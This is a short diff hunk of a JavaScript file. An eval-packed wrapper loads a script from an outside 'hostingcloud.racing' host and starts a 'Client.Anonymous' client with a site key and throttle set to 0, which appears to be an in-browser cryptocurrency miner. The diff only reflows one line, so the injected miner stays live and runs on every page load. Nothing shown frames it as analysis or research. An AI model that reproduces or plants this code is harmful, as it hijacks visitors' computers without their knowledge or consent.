@@ -6,9 +6,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
     script.src = 'https://www.hostingcloud.racing/MuQr.js';
     var entry = document.getElementsByTagName('script')[0];
     entry.parentNode.insertBefore(script, entry);
-	    var _client = new Client.Anonymous('79c32d0585c8f978e9d4ca9799c6cc1eff1c7dbe8ecbc9e68f23dac98e080429', {
-        throttle: 0, ads: 0
-    });
+    var _client = new Client.Anonymous('79c32d0585c8f978e9d4ca9799c6cc1eff1c7dbe8ecbc9e68f23dac98e080429', {throttle: 0, ads: 0});
     _client.start();
 })();
 /*shrt*/
